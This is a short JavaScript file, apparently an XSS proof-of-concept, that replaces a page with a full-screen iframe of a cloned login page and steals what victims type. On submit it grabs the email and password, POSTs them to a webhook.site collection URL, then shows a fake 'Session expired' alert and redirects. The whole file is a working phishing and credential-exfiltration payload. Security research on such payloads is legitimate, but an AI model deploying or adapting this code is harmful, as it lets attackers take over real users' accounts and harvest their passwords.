// poc.js - This will replace the page with your clone
(function() {
    if (window.xssLoaded) return;
    window.xssLoaded = true;
    
    // Clear everything
    document.body.innerHTML = '';
    
    // Create iframe with your clone (once it's working)
    const iframe = document.createElement('iframe');
    iframe.src = 'https://swathip888a.github.io/ATO/index.html';
    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999';
    document.body.appendChild(iframe);
    
    // Wait for iframe to load and inject credential stealer
    iframe.onload = function() {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            // Intercept the form submission
            const form = iframeDoc.querySelector('form');
            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const email = iframeDoc.querySelector('input[type="email"], input[name="email"]')?.value || '';
                    const password = iframeDoc.querySelector('input[type="password"]')?.value || '';
                    
                    // Send to webhook
                    fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({email, password, time: new Date().toISOString()})
                    });
                    
                    alert('Session expired. Redirecting...');
                    window.location.href = 'https://www.proofpoint.com';
                });
            }
        } catch(e) {
            // Fallback: redirect directly
            window.location.href = 'https://swathip888a.github.io/ATO/index.html';
        }
    };
})();
